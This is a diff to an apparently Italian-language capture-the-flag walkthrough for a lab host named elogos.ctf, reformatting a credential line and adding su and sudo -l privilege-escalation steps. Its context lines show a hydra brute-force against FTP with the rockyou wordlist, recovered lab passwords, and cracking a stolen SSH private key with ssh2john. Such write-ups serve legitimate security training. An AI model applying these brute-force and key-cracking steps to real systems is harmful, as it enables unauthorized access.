@@ -12,7 +12,7 @@ After that launch a brute force with hydra on ftp to gain access
 ```
 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://elogos.ctf
 ```
-""Creds = j.brock:princess""
+==Creds = j.brock:princess==
 ls -la and take the private ssh key. Crack it.
 ```
 ssh2john id_rsa > hash
@@ -128,6 +128,11 @@ all'interno del keepass c'è la password per l'utente
 ==Password = nZ!mqdhbNA5YQ$Q$C5VdUh==
 
 Puoi fare
+```bash
+su m.hack
 ```
-su
+per stabilizzare la shell. Poi fai
+```bash
+sudo -l
 ```
+
